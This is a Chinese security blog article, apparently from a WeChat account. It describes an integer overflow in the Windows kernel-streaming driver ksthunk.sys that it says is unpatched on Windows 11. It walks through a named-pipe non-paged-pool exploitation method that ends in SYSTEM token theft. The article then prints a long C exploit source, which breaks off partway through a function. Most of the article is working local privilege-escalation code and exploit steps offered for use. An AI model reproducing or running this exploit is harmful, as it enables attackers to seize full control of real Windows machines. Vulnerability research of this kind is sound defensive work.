#  仍未出补丁,Windows新的PE漏洞及完整利用代码   
 二进制空间安全   2024-11-29 03:34  
  
part1  
  
  
点击上方  
蓝字关注我们  
  
  
  
往期推荐  
  
  
  
[解密还原被BitLocker加密的数据](https://mp.weixin.qq.com/s?__biz=MzkxOTUyOTc0NQ==&mid=2247492631&idx=1&sn=040fddbaa96b7bfef0c29aecf78b5c9b&scene=21#wechat_redirect)  
  
  
[MySQL渗透实战](http://mp.weixin.qq.com/s?__biz=MzkxOTUyOTc0NQ==&mid=2247492419&idx=1&sn=3628b04de7316563b4b4facc13a4d60d&chksm=c1a2133df6d59a2b5e94300e06e842d8f0ad6364a3d20cd87e06fa0364ba854a031eda515ffb&scene=21#wechat_redirect)  
  
  
[比netcat更高级的网络渗透基础工具](http://mp.weixin.qq.com/s?__biz=MzkxOTUyOTc0NQ==&mid=2247492348&idx=1&sn=aa6fbaa750fcc8c843675cff90bc76f6&chksm=c1a21282f6d59b94d5426dc8dcb42d10cadec163c1fd478f91b50287e8ad13dd7b973f32512c&scene=21#wechat_redirect)  
  
  
[黑客渗透超级管理终端](http://mp.weixin.qq.com/s?__biz=MzkxOTUyOTc0NQ==&mid=2247492286&idx=1&sn=56a683c028349617626341b6f4883d67&chksm=c1a212c0f6d59bd6d166f5a59cf5ed35bb29318d2ba1f8b35e93f2150c7d565e721e3e1933cc&scene=21#wechat_redirect)  
  
  
[一款超乎想象的Windows提权工具](http://mp.weixin.qq.com/s?__biz=MzkxOTUyOTc0NQ==&mid=2247486680&idx=2&sn=0e61be01ea31e9c15f305b45b7fed674&chksm=c1a1fca6f6d675b0e97cc79ad3f5c288b0151f59672d4b1aa357b28ee1445427c09364abaa39&scene=21#wechat_redirect)  
  
  
[世界顶级渗透测试标准方法](http://mp.weixin.qq.com/s?__biz=MzkxOTUyOTc0NQ==&mid=2247486761&idx=2&sn=58067fe5ff5809ff4c7e616f120de2ab&chksm=c1a1fd57f6d674410e1d19164a87985973721b233eca883436cd9260a1ccab8f81b4552ca897&scene=21#wechat_redirect)  
  
  
[Nmap的三种漏洞扫描模式原理及实战讲解](http://mp.weixin.qq.com/s?__biz=MzkxOTUyOTc0NQ==&mid=2247486276&idx=1&sn=69bc6e1874b1ef46c1747995c244ec47&chksm=c1a1fb3af6d6722c38d1160921a590351191d45b57ecede02618ca94e54564c01260b04daa55&scene=21#wechat_redirect)  
  
  
[Windows下24种进程注入方法模板](http://mp.weixin.qq.com/s?__biz=MzkxOTUyOTc0NQ==&mid=2247491308&idx=1&sn=46294d95c4f3ddbc2cf9436a5687918f&chksm=c1a1ee92f6d6678442995217091fde1df1199b6e824fc1c29101bd35abac94f09090add5c30d&scene=21#wechat_redirect)  
  
  
[黑客在Windows系统下提权的8种主要姿势](http://mp.weixin.qq.com/s?__biz=MzkxOTUyOTc0NQ==&mid=2247487903&idx=1&sn=ec535ffa91800e3c5ef48e602c8a0e20&chksm=c1a1e1e1f6d668f7cd82cb29d568934f6bc03f06add680dcb6db5d10bffd9a62f13aab883530&scene=21#wechat_redirect)  
  
  
[EDR联动数据包封锁技术](http://mp.weixin.qq.com/s?__biz=MzkxOTUyOTc0NQ==&mid=2247491131&idx=1&sn=c0d29d5017a4b8e67b7965ae9441efcc&chksm=c1a1ee45f6d66753e0317afddaf44b8729678fe9fdc264de4babfd818b6c6f48c65133b8d2ba&scene=21#wechat_redirect)  
  
  
  
将二进制空间安全设为"星标⭐️"  
  
第一时间收到文章更新  
###   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Too3Q2geBBcBtzlnEOEbnYytDiaUtSMle9N2JXiaRiaG1iahAiaCMAvAOdInNLfkSLJ9IicblOVzkYB0aFKenqMFnG5A/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tFQwTxxFG2WZicsgibWiaiatIvLkGwcF7yKwmia6CtDcg293ZoVgf8ictCrVsJQjzkrByb4Jp8CWz1ozWUnJd7NKtFlA/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucV2Dc6xtKux3TiaYo3RnRpibIibjuibibZlraHIls0vqHyLJvRicNMFZa4hR5emcDiaSkBwrPgkKOyMUEQqTzjJPceDg/640?from=appmsg "")  
  
摘要  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/5dSQuzHf0ZtSxQKP10uurLXZH8usWznWkDrU44LjZRJGqicCib4FUI4psoHg5noiaaQpAKQXLIUP74lKPNDhWKdQg/640?from=appmsg "")  
  
  
  
在 ksthunk.sys 的CKSAutomationThunk::ThunkEnableEventIrp  
 中存在一个整数溢出漏洞，本地攻击者可以利用该漏洞提升在 Windows 操作系统中的权限。在 TyphoonPWN 2024 活动中，成功展示了该漏洞的利用，并获得了第二名。经过数月等待，厂商告知该漏洞为重复漏洞，且已修复（但未说明具体修复时间）。然而，当在最新版本的 Windows 11 上测试时，该漏洞依然有效。厂商未提供 CVE 编号或补丁信息。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0nJYWtDC09c8a9n4P0qlRZ1CW1VOYwDEicJorpXHFpWE1K1SzeJgWh0PXO1sTSKOK29jUl4l63uicYibEcz67esIA/640?wx_fmt=jpeg&from=appmsg "")  
###   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Too3Q2geBBcBtzlnEOEbnYytDiaUtSMle9N2JXiaRiaG1iahAiaCMAvAOdInNLfkSLJ9IicblOVzkYB0aFKenqMFnG5A/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tFQwTxxFG2WZicsgibWiaiatIvLkGwcF7yKwmia6CtDcg293ZoVgf8ictCrVsJQjzkrByb4Jp8CWz1ozWUnJd7NKtFlA/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucV2Dc6xtKux3TiaYo3RnRpibIibjuibibZlraHIls0vqHyLJvRicNMFZa4hR5emcDiaSkBwrPgkKOyMUEQqTzjJPceDg/640?from=appmsg "")  
  
技术分析  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/5dSQuzHf0ZtSxQKP10uurLXZH8usWznWkDrU44LjZRJGqicCib4FUI4psoHg5noiaaQpAKQXLIUP74lKPNDhWKdQg/640?from=appmsg "")  
  
  
  
该漏洞影响版本: Windows 11 23H2  
  
ksthunk.sys 是用于内核流服务的 WOW 处理程序，其目的是确保 32 位进程在 64 位系统上正确运行。其中，当 IOCTL 编号为 0x2F0007 时，会调用 CKSAutomationThunk::ThunkEnableEventIrp。其工作流程如下：  
  
```
// Only Called when the calling process is 32bit.
__int64 __fastcall CKSAutomationThunk::ThunkEnableEventIrp(__int64 a1, PIRP a2, __int64 a3, int *a4)
{
  ...
  inbuflen = CurrentStackLocation->Parameters.DeviceIoControl.InputBufferLength;
  outbuflen = CurrentStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
  // [1]. Align the length of output buffer
  outlen_adjust = (outbuflen + 0x17) & 0xFFFFFFF8;
  if ( a2->AssociatedIrp.MasterIrp )
    return 1i64;

  if ( (unsigned int)inbuflen < 0x18 )
    ExRaiseStatus(-1073741306);

  ProbeForRead(CurrentStackLocation->Parameters.DeviceIoControl.Type3InputBuffer, inbuflen, 1u);
  if ( (*((_DWORD *)CurrentStackLocation->Parameters.DeviceIoControl.Type3InputBuffer + 5) & 0xEFFFFFFF) == 1
    || (*((_DWORD *)CurrentStackLocation->Parameters.DeviceIoControl.Type3InputBuffer + 5) & 0xEFFFFFFF) == 2
    || (*((_DWORD *)CurrentStackLocation->Parameters.DeviceIoControl.Type3InputBuffer + 5) & 0xEFFFFFFF) == 4 )
  {
    // [2]. Validate the Length
    if ( (unsigned int)outbuflen < 0x10 )
      ExRaiseStatus(-1073741306);
    if ( outlen_adjust < (int)outbuflen + 16 || outlen_adjust + (unsigned int)inbuflen < outlen_adjust )
      ExRaiseStatus(-1073741306);

    // [3]. Allocate the buffer to store the data
    // 0x61 == POOL_FLAG_USE_QUOTA | POOL_FLAG_RAISE_ON_FAILURE POOL_FLAG_NON_PAGED
    a2->AssociatedIrp.MasterIrp = (struct _IRP *)ExAllocatePool2(
                                                   0x61i64,
                                                   outlen_adjust + (unsigned int)inbuflen,
                                                   1886409547i64);
    a2->Flags |= 0x30u;
    ProbeForRead(a2->UserBuffer, outbuflen, 1u); // [*] 
    data = (__int64)a2->AssociatedIrp.MasterIrp;
    ...
    // [4]. Copy the Data
    if ( (unsigned int)outbuflen > 0x10 )
      memmove((void *)(data + 0x20), (char *)a2->UserBuffer + 16, outbuflen - 16);
    memmove(
      (char *)a2->AssociatedIrp.MasterIrp + outlen_adjust,
      CurrentStackLocation->Parameters.FileSystemControl.Type3InputBuffer,
      inbuflen);
    ...
}
```  
  
  
CKSAutomationThunk::ThunkEnableEventIrp 为 64 位系统正确保存输入和输出数据分配了一个新缓冲区。在 [1] 处，通过计算 (outbuflen + 0x17) & 0xFFFFFFF8 来调整输出缓冲区的对齐方式，从而得到 outlen_adjust。在 [2] 处，对某些长度进行了一些验证后，在 [3] 处分配了大小为 outlen_adjust + inbuflen 的缓冲区。最后，在 [4] 处将数据复制到该缓冲区中。  
  
然而，在 [1] 处，计算 outbuflen + 0x17 时没有进行整数溢出验证。因此，outlen_adjust 可能被设置为较小的值，这导致在 [2] 处分配了较小的缓冲区大小。最终，在 [4] 处复制数据时会发生堆溢出。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0nJYWtDC09c8a9n4P0qlRZ1CW1VOYwDEpNvgRGUC8laDJBo5bW9kDwR3dMibqHoANN8KwLeXiayDybgQqcy33KDg/640?wx_fmt=png&from=appmsg "")  
  
成功利用该漏洞面临两个困难点:  
  
首先，ProbeForRead(a2->UserBuffer, outbuflen, 1u) 会检查 a2->UserBuffer 的大小是否为 outbuflen。要制造整数溢出，outbuflen 必须大于 0xFFFFFFE9。在 32 位程序中，我们无法分配如此大的内存空间。然而，ProbeForRead 的实现并不会检查缓冲区的大小，它只检查地址。  
  
```
VOID ProbeForRead(ULONG_PTR Address, SIZE_T Length, ULONG Alignment) {
  if ((Length) != 0) {
    if ( (Address & (Alignment - 1)) != 0) {
      ExRaiseDatatypeMisalignment();
    }
    if ( (Address + Length - 1) < Address || (Address + Length - 1) > MM_USER_PROBE_ADDRESS) {
      ExRaiseAccessViolation(); 
    }
  }
}
```  
  
  
如上所示，ProbeForRead 只会检查地址的结束是否超出 MM_USER_PROBE_ADDRESS。由于地址被视为 ULONG_PTR（64 位），我们可以在不映射内存的情况下绕过 ProbeForRead(a2->UserBuffer, outbuflen, 1u)。  
  
其次，在 [4] 处，数据的复制大小为 outbuflen - 16。正如之前提到的，由于 outbuflen 必须大于 0xFFFFFFE9，这一复制过程很可能导致崩溃。但通过利用用户内存故障异常，我们可以避免崩溃并按所需大小进行复制。如果发生用户内存故障异常，执行将停止并仅返回一个错误。因此，我们可以将内存布局设计如下所示。  
  
```
a2->UserBuffer
+======================================
| ...... Buffer ....... | Unmapped Memory
+======================================
 ---------------------->| Copying until here
Kernel Memory
+======================================
| Allocated Mem | Next Memory ... | 
+======================================
```  
  
  
在复制数据时，当遇到未映射的内存时会发生用户内存故障异常。因此，复制过程将在预期的位置停止。  
###   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Too3Q2geBBcBtzlnEOEbnYytDiaUtSMle9N2JXiaRiaG1iahAiaCMAvAOdInNLfkSLJ9IicblOVzkYB0aFKenqMFnG5A/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tFQwTxxFG2WZicsgibWiaiatIvLkGwcF7yKwmia6CtDcg293ZoVgf8ictCrVsJQjzkrByb4Jp8CWz1ozWUnJd7NKtFlA/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucV2Dc6xtKux3TiaYo3RnRpibIibjuibibZlraHIls0vqHyLJvRicNMFZa4hR5emcDiaSkBwrPgkKOyMUEQqTzjJPceDg/640?from=appmsg "")  
  
漏洞利用过程  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/5dSQuzHf0ZtSxQKP10uurLXZH8usWznWkDrU44LjZRJGqicCib4FUI4psoHg5noiaaQpAKQXLIUP74lKPNDhWKdQg/640?from=appmsg "")  
  
  
  
缓冲区溢出发生在非分页池（Non-paged pool）中，我们可以利用命名管道（Named-pipe）技术进行漏洞利用。此外，由于分配大小和数据完全可被攻击者控制，因此漏洞利用难度不高。  
  
在构造我的漏洞利用时，参考了该文档：  
https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation/tree/master  
。漏洞利用步骤如下：  
  
1.喷射大小为 0x1000 的命名管道对象，并在它们之间制造一个间隙。较大的池（如大池 Large Pool）相比 LFH（低碎片堆）或 VS（虚拟分配池）在创建漏洞利用时更稳定。  
  
2.触发 OOB（越界）漏洞。此操作会覆盖相邻的命名管道，其内存布局如下所示:  
  
```
DATA_QUEUE_ENTRY:
 NextEntry=whatever;
 Irp=ideally 0;
 SecurityContext=ideally 0;
 EntryType=0;
 QuotaInEntry=ideally 0; //mostly irrelevent in case we use the peek operation
 DataSize=something bigger than the original size;
 x=whatever;
```  
  
  
3.利用被破坏的命名管道揭露相邻命名管道的数据。从这些信息中，我们可以获取池的内存地址。  
  
4.再次触发 OOB 漏洞，构造任意读（arbitrary read）原语。被破坏的命名管道的内存布局如下：  
  
(   
https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation/tree/master?tab=readme-ov-file#complete-control-over-the-overflow-data  
 )  
  
```
DATA_QUEUE_ENTRY:
 NextEntry=whatever;
 Irp=Forged IRP Address;
 SecurityContext=ideally 0;
 EntryType=1;
 QuotaInEntry=ideally 0;
 DataSize=arbitrary read size;
 x=whatever;
IRP->SystemBuffer = arbitrary read address
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0nJYWtDC09c8a9n4P0qlRZ1CW1VOYwDE8VDf8opbMjykc94Xye0mseQnnSBfnuicX49b8gjrHa8icITVjmLEz9ibA/640?wx_fmt=png&from=appmsg "")  
  
  
5.通过调用 NtFsControlFile 将 IRP 包插入到命名管道中：  
  
```
NtFsControlFile(pipe, 0, 0, 0, &isb, 0x119FF8, buffer, 0x1000, 0, 0);
```  
  
  
然后，通过步骤 3 中泄露的数据获取 IRP 的地址。  
  
6.使用任意读原语获取系统令牌地址, 如下所示:  
  
```
CurThread_Irp = *(IRP + 0x20)
CurProcess = *(CurThread - IrpListOffset + ProcessOffset)
SystemProcess = Search active process list on CurProcess
SystemToken = *(SystemProcess + TokenOffset)
```  
  
  
7.再次触发 OOB 漏洞，构造任意写（arbitrary write）原语。由于 vp777 文档中的技术在程序退出后可能会导致崩溃或系统假死，这里采用了其他技术实现任意写（在后文详细解释）。  
  
8.将当前进程的令牌覆盖为 SYSTEM 令牌。  
  
9.利用步骤 3 中泄露的数据还原被破坏的命名管道数据。  
  
10.获得系统权限并享受管理员特权。  
###   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Too3Q2geBBcBtzlnEOEbnYytDiaUtSMle9N2JXiaRiaG1iahAiaCMAvAOdInNLfkSLJ9IicblOVzkYB0aFKenqMFnG5A/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tFQwTxxFG2WZicsgibWiaiatIvLkGwcF7yKwmia6CtDcg293ZoVgf8ictCrVsJQjzkrByb4Jp8CWz1ozWUnJd7NKtFlA/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucV2Dc6xtKux3TiaYo3RnRpibIibjuibibZlraHIls0vqHyLJvRicNMFZa4hR5emcDiaSkBwrPgkKOyMUEQqTzjJPceDg/640?from=appmsg "")  
  
任意写入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/5dSQuzHf0ZtSxQKP10uurLXZH8usWznWkDrU44LjZRJGqicCib4FUI4psoHg5noiaaQpAKQXLIUP74lKPNDhWKdQg/640?from=appmsg "")  
  
  
  
为了利用漏洞，可以利用 nt!IopfCompleteRequest 代码，其具体实现如下所示：  
  
```
...
  flags = irp->Flags;
  if ( (flags & 0x402) != 0 )
  {
    if ( (flags & 0x440) == 0 )
    {
      IopDequeueIrpFromThread(irp);
      KeInitializeApc(
        (_DWORD)Irp + 120,
        (int)Irp->Tail.Overlay.Thread,
        Irp->ApcEnvironment,
        (int)IopCompletePageWrite,
        0i64,
        0i64,
        0,
        0i64);
      KeInsertQueueApc(&Irp->Tail, 0i64, 0i64, v27);
      return;
    }
    *irp->UserIosb = irp->IoStatus; // [*], copying 16bytes.
    v56 = flags & 0x42;
    if ( !v56 )
      goto Set_Event_Return;
```  
  
  
通过该漏洞，IRP 的数据可以完全被控制。因此，在代码中的 [*] 处，我们可以通过将 irp->UserIosb 设置为目标地址，并将 irp->IoStatus 设置为目标值，构造任意写原语。这条指令会复制结构体 _IO_STATUS_BLOCK（占用 16 字节）。  
  
```
typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    } DUMMYUNIONNAME;
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
```  
  
  
然而，在到达该点之前，IoStatus 的值已经发生了变化。以下代码展示了 IoStatus 的变化：  
  
```
...
  if ( QueueEntry->EntryType >= 2 ){
    irp = NpRemoveDataQueueEntry((DATA_QUEUE_ENTRY **)a2, 0, a9);
    if ( irp )
    {
      irp->IoStatus.Status = 0; // only Status set to zero
      v45 = &irp->Tail.Overlay.ListEntry;
      v46 = a9->Blink;
      if ( v46->Flink != a9 )
        goto LABEL_110;
      v45->Flink = a9;
      v45->Blink = v46;
      v46->Flink = v45;
      a9->Blink = v45;
    }
    ...
  }
  ...
```  
  
  
如果命名管道条目的 EntryType 大于 2，则该条目会被 NpRemoveDataQueueEntry 移除，因为该条目无效。移除条目后，irp->IoStatus.Status 被设置为 0。然而，IoStatus.Information 并不会改变。因此，可以利用这一特性构造（部分的）任意写原语。  
  
```
+0x468 CreateTime : _LARGE_INTEGER
+0x470 ProcessQuotaUsage : [2] Uint8B
+0x480 ProcessQuotaPeak : [2] Uint8B
+0x490 PeakVirtualSize : Uint8B
+0x498 VirtualSize : Uint8B
+0x4a0 SessionProcessLinks : _LIST_ENTRY
+0x4b0 ExceptionPortData : Ptr64 Void // Is it ok if it is overwritten to zero?
+0x4b0 ExceptionPortValue : Uint8B // Is it ok if it is overwritten to zero?
+0x4b0 ExceptionPortState : Pos 0, 3 Bits // Is it ok if it is overwritten to zero?
+0x4b8 Token : _EX_FAST_REF // Target Field
+0x4c0 MmReserved : Uint8B
+0x4c8 AddressCreationLock : _EX_PUSH_LOCK
+0x4d0 PageTableCommitmentLock : _EX_PUSH_LOCK
```  
  
  
幸运的是，如果 ExceptionPortData/ExceptionPortValue（位于 Token 之前的字段）被清零，不会引发问题。因此，可以利用此原语，将当前进程的令牌覆盖为 SYSTEM 令牌，从而获得系统权限。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0nJYWtDC09c8a9n4P0qlRZ1CW1VOYwDECJ2F2tetVLKuHIP57hZibHCsJgtcN6WIVkeNXbl9bsP2PtVDPZRVvBA/640?wx_fmt=png&from=appmsg "")  
###   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Too3Q2geBBcBtzlnEOEbnYytDiaUtSMle9N2JXiaRiaG1iahAiaCMAvAOdInNLfkSLJ9IicblOVzkYB0aFKenqMFnG5A/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tFQwTxxFG2WZicsgibWiaiatIvLkGwcF7yKwmia6CtDcg293ZoVgf8ictCrVsJQjzkrByb4Jp8CWz1ozWUnJd7NKtFlA/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ucV2Dc6xtKux3TiaYo3RnRpibIibjuibibZlraHIls0vqHyLJvRicNMFZa4hR5emcDiaSkBwrPgkKOyMUEQqTzjJPceDg/640?from=appmsg "")  
  
完整利用代码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/5dSQuzHf0ZtSxQKP10uurLXZH8usWznWkDrU44LjZRJGqicCib4FUI4psoHg5noiaaQpAKQXLIUP74lKPNDhWKdQg/640?from=appmsg "")  
  
  
  
  
```
#include <Windows.h>
#include <winternl.h>
#include <winnt.h>
#include <stdio.h>
#include <cfgmgr32.h>

#pragma comment(lib, "Cfgmgr32.lib")

#define DATA_ENTRY_HEADER_SIZE 0x30
#define ENTRY_DATASIZE(x)((x) - DATA_ENTRY_HEADER_SIZE)

/* IRP for 64bitnt!_IRP   +0x000 Type : Int2B   +0x002 Size : Uint2B   +0x004 AllocationProcessorNumber : Uint2B   +0x006 Reserved : Uint2B   +0x008 MdlAddress : Ptr64 _MDL   +0x010 Flags : Uint4B   +0x018 AssociatedIrp : <unnamed-tag>   +0x020 ThreadListEntry : _LIST_ENTRY   +0x030 IoStatus : _IO_STATUS_BLOCK   +0x040 RequestorMode : Char   +0x041 PendingReturned : UChar   +0x042 StackCount : Char   +0x043 CurrentLocation : Char   +0x044 Cancel : UChar   +0x045 CancelIrql : UChar   +0x046 ApcEnvironment : Char   +0x047 AllocationFlags : UChar   +0x048 UserIosb : Ptr64 _IO_STATUS_BLOCK   +0x048 IoRingContext : Ptr64 Void   +0x050 UserEvent : Ptr64 _KEVENT   +0x058 Overlay : <unnamed-tag>   +0x068 CancelRoutine : Ptr64 void   +0x070 UserBuffer : Ptr64 Void   +0x078 Tail : <unnamed-tag>*/
#pragma pack(push, 8)
typedef struct {
  SHORT Type;
  USHORT Size;
  USHORT AllocationProcessorNumber;
  PVOID64 MdlAddress;
  ULONG Flags;

  PVOID64 AssociatedIrp;
  LIST_ENTRY64 ThreadListEntry;

  union {
    NTSTATUS Status;
    PVOID64 Pointer;
  }
  IoStatus;
  PVOID64 Information;

  CHAR RequestorMode;
  BOOLEAN PendingReturned;
  CHAR StackCount;
  CHAR CurrentLocation;
  BOOLEAN Cancel;
  UCHAR CancelIrql;
  CCHAR ApcEnvironment;
  UCHAR AllocationFlags;

  PVOID64 UserIosb;
  PVOID64 UserEvent;
  char Overlay[16];
  PVOID64 CancelRoutine;
  PVOID64 UserBuffer;
  CHAR TailIsWrong;
}
IRP;
#pragma pack(pop)

typedef void(IO_APC_ROUTINE)(  void * ApcContext,  IO_STATUS_BLOCK * IoStatusBlock,  unsigned long reserved);

typedef int(__stdcall * NTFSCONTROLFILE)(  HANDLE fileHandle,  HANDLE event,  IO_APC_ROUTINE * apcRoutine,  void * ApcContext,  IO_STATUS_BLOCK * ioStatusBlock,  unsigned long FsControlCode,  void * InputBuffer,  unsigned long InputBufferLength,  void * OutputBuffer,  unsigned long OutputBufferLength);

typedef NTSTATUS( * pNtWow64WriteVirtualMemory64)(  HANDLE ProcessHandle,  unsigned __int64 BaseAddress,  void * Buffer,  unsigned __int64 Size,  unsigned __int64 * NumberOfBytesWritten);

typedef struct {
  HANDLE r;
  HANDLE w;
}
PIPE_HANDLES;

#define PIPESIZE 0x1000
PIPE_HANDLES pipes[PIPESIZE];
PIPE_HANDLES holder;

void CreateSprayPipe(PIPE_HANDLES * ph, DWORD quota = -1) {
  ph -> w = CreateNamedPipe(
    L "\\\\.\\pipe\\exploit_test",
    PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
    PIPE_TYPE_BYTE | PIPE_WAIT,
    PIPE_UNLIMITED_INSTANCES,
    quota,
    quota,
    0,
    0);
  ph -> r = CreateFile(L "\\\\.\\pipe\\exploit_test", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);
}
void WriteDataEntry(PIPE_HANDLES ph, PVOID WriteData, DWORD32 len) {
  WriteFile(ph.w,
    WriteData,
    ENTRY_DATASIZE(len),
    NULL,
    NULL);
}

void ReadDataEntry(PIPE_HANDLES ph, PVOID ReadBuffer, DWORD32 len) {
  ReadFile(ph.r,
    ReadBuffer,
    ENTRY_DATASIZE(len),
    NULL,
    NULL);
}

#define MARKER 0x9999999988888888
DWORD64 readthis = MARKER;
IRP fakeirp;
IRP * fakeirp_w;
BYTE fakeevent[0x80];
DWORD64 dummyvalue;

#define inputsize 0x1000 // >0x18, Allocation Size, Copy From +0x20
#define outputsize 0x1060 // Copy size-0x10, Should Copy by 0x40
LPBYTE inbuffer;
LPBYTE outbuffer;

DWORD64 flink = 0; // Used for Recovering
DWORD64 blink = 0; // Used for Recovering
DWORD64 thread_list[2];

DWORD overflowidx = 0;

void setupaar(LPBYTE buffer, DWORD64 readaddr = (DWORD64) & readthis, DWORD size = 0x8) {
  fakeirp.AssociatedIrp = (PVOID64) readaddr;
  // Setup Overflow Data
  *(DWORD64 * )(buffer + 0x0) = flink; // NextEntry->Flink
  *(DWORD64 * )(buffer + 0x8) = blink; // NextEntry->Blink
  *(DWORD64 * )(buffer + 0x10) = (DWORD64) & fakeirp; // IRP
  *(DWORD64 * )(buffer + 0x18) = (DWORD64) 0; // SecurityContext
  *(DWORD * )(buffer + 0x20) = (DWORD) 1; // Entry Type
  *(DWORD * )(buffer + 0x24) = (DWORD) 0; // QuotaEntry
  *(DWORD * )(buffer + 0x28) = (DWORD) size; // DataSize
  *(DWORD * )(buffer + 0x2C) = (DWORD) 0; // x
}

void setupoobread(LPBYTE buffer, DWORD size) {
  // Setup Overflow Data
  *(DWORD64 * )(buffer + 0x0) = flink; // NextEntry->Flink
  *(DWORD64 * )(buffer + 0x8) = blink; // NextEntry->Blink
  *(DWORD64 * )(buffer + 0x10) = (DWORD64) 0; // IRP
  *(DWORD64 * )(buffer + 0x18) = (DWORD64) 0; // SecurityContext
  *(DWORD * )(buffer + 0x20) = (DWORD) 0; // Entry Type
  *(DWORD * )(buffer + 0x24) = (DWORD) 0; // QuotaEntry
  *(DWORD * )(buffer + 0x28) = (DWORD) size; // DataSize
  *(DWORD * )(buffer + 0x2C) = (DWORD) 0; // x
}

void setuprecoverdata(LPBYTE buffer, DWORD size) {
  // Setup Overflow Data
  *(DWORD64 * )(buffer + 0x0) = flink; // NextEntry->Flink
  *(DWORD64 * )(buffer + 0x8) = blink; // NextEntry->Blink
  *(DWORD64 * )(buffer + 0x10) = (DWORD64) 0; // IRP
  *(DWORD64 * )(buffer + 0x18) = (DWORD64) 0; // SecurityContext
  *(DWORD * )(buffer + 0x20) = (DWORD) 0; // Entry Type
  *(DWORD * )(buffer + 0x24) = (DWORD) size; // QuotaEntry
  *(DWORD * )(buffer + 0x28) = (DWORD) size; // DataSize
  *(DWORD * )(buffer + 0x2C) = (DWORD) 0; // x
}

void setuparw(LPBYTE buffer, DWORD64 dstaddr, DWORD64 * value, DWORD size = 0x10) {
  #define IRP_BUFFERED_IO 0x00000010
  #define IRP_DEALLOCATE_BUFFER 0x00000020
  #define IRP_INPUT_OPERATION 0x00000040
  // Setup Overflow Data
  fakeirp_w -> Flags = 0x0060400;
  fakeirp_w -> CurrentLocation = fakeirp_w -> StackCount + 1;
  fakeirp_w -> UserIosb = (PVOID64) dstaddr;
  memcpy((void * ) & fakeirp_w -> IoStatus, value, 0x10);
  //fakeirp_w->CancelRoutine = NULL;

  fakeirp_w -> UserEvent = (PVOID64) fakeevent;
  *(DWORD * )(fakeevent + 4) = 1; // Set State

  /*  fakeirp_w->Flags |= IRP_BUFFERED_IO | IRP_INPUT_OPERATION;  fakeirp_w->Flags &= ~IRP_DEALLOCATE_BUFFER;  fakeirp_w->AssociatedIrp = (PVOID64)srcaddr; // src  fakeirp_w->UserBuffer = (PVOID64)dstaddr; // dst  fakeirp_w->ThreadListEntry.Flink = (ULONGLONG)(thread_list);  fakeirp_w->ThreadListEntry.Blink = (ULONGLONG)(thread_list);  thread_list[0] = thread_list[1] = (DWORD64)((LPBYTE)fakeirp_w + offsetof(IRP, ThreadListEntry.Flink));  */

  *(DWORD64 * )(buffer + 0x0) = flink; // NextEntry->Flink
  *(DWORD64 * )(buffer + 0x8) = blink; // NextEntry->Blink
  *(DWORD64 * )(buffer + 0x10) = (DWORD64) fakeirp_w; // IRP
  *(DWORD64 * )(buffer + 0x18) = (DWORD64) 0; // SecurityContext
  *(DWORD * )(buffer + 0x20) = (DWORD) 2; // Entry Type
  *(DWORD * )(buffer + 0x24) = (DWORD) size - 1; // QuotaEntry
  *(DWORD * )(buffer + 0x28) = (DWORD) size; // DataSize
  *(DWORD * )(buffer + 0x2C) = (DWORD) 0; // x
}

void setupbug(LPBYTE buffer, DWORD64 bugaddr, DWORD size = 0xfc0) {

  *(DWORD64 * )(buffer + 0x0) = flink; // NextEntry->Flink
  *(DWORD64 * )(buffer + 0x8) = blink; // NextEntry->Blink
  *(DWORD64 * )(buffer + 0x10) = (DWORD64) bugaddr; // IRP
  *(DWORD64 * )(buffer + 0x18) = (DWORD64) 0; // SecurityContext
  *(DWORD * )(buffer + 0x20) = (DWORD) 2; // Entry Type
  *(DWORD * )(buffer + 0x24) = (DWORD) size; // QuotaEntry
  *(DWORD * )(buffer + 0x28) = (DWORD) size; // DataSize
  *(DWORD * )(buffer + 0x2C) = (DWORD) 0; // x
}

DWORD64 readQWORD(DWORD64 addr) {
  DWORD64 readdata;
  DWORD read;
  fakeirp.AssociatedIrp = (PVOID64)(addr);
  PeekNamedPipe(pipes[overflowidx].r, & readdata, 8, & read, NULL, NULL);
  return readdata;
}

void writeQWORD(DWORD64 addr, DWORD64 value) {
  DWORD64 writedata = value;
  DWORD read;
  fakeirp_w -> AssociatedIrp = (PVOID64)( & writedata);
  fakeirp_w -> UserBuffer = (PVOID64)(addr);
  fakeirp_w -> ThreadListEntry.Flink = (ULONGLONG)(thread_list);
  fakeirp_w -> ThreadListEntry.Blink = (ULONGLONG)(thread_list);
  thread_list[0] = thread_list[1] = (DWORD64)((LPBYTE) fakeirp_w + offsetof(IRP, ThreadListEntry.Flink));

